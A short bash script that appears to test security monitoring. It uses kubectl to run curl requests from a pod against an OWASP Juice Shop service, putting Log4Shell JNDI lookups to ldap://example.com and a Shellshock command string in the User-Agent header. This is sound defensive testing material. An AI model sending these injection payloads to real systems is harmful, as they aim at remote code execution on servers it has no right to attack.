#!/bin/bash

# Function to run curl command inside the pod
run_curl_in_pod() {
    # Parameters
    LOCAL_CURL_COMMAND=$1
    JUICE_SHOP_SVC=$2

    # Get the pod name with label app=diag
    POD_NAME=$(kubectl get pods -l app=diag -o jsonpath='{.items[0].metadata.name}')
    
    if [ -z "$POD_NAME" ]; then
        echo "No pod found with label app=diag"
        exit 1
    fi

    # Run the curl command inside the pod
    kubectl exec $POD_NAME -- bash -c "$LOCAL_CURL_COMMAND http://$JUICE_SHOP_SVC:3000/api/Products"
}

# Define the Juice Shop service address in a variable
service_address="juiceshop-service.security.svc.cluster.local"

# Correctly formatted payloads with added Max wait time (e.g., 30 seconds)
payload='curl --max-time 5 -H "User-Agent: \${jndi:ldap://example.com/a}"'
run_curl_in_pod "$payload" "$service_address"

# Malicious payload with a command injection attempt, added max-time
payload='curl --max-time 5 -H "User-Agent: {jndi:ldap://example.com/a}"'
run_curl_in_pod "$payload" "$service_address"

# Another variation of a malicious payload with max-time
payload='curl --max-time 5 -H "User-Agent: () { :; }; /bin/ls"'
run_curl_in_pod "$payload" "$service_address"

